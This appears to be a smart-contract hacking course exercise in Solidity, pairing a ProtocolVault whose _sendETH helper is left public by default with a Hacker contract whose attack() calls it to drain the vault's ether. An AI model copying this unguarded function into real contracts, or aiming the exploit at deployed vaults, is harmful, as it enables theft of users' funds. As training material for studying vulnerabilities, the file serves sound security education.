// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.4.24;

/**
 * @title ProtocolVault
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract ProtocolVault {
    
    // Contract owner
    address public owner; 

    function ProtocolVault() public {
        owner = msg.sender;
    }
 
    function withdrawETH() external {
        require(msg.sender == owner, "Not owner");
        this._sendETH(msg.sender);
    }
 
    function _sendETH(address to) {
      to.transfer(address(this).balance);
    }

    function() external payable {}
}

contract Hacker {
    ProtocolVault vault;
    address owner;

    function Hacker(address _vault) {
        vault = ProtocolVault(_vault);
        owner = msg.sender;
    }

    function attack() {
        vault._sendETH(msg.sender);
    }



}

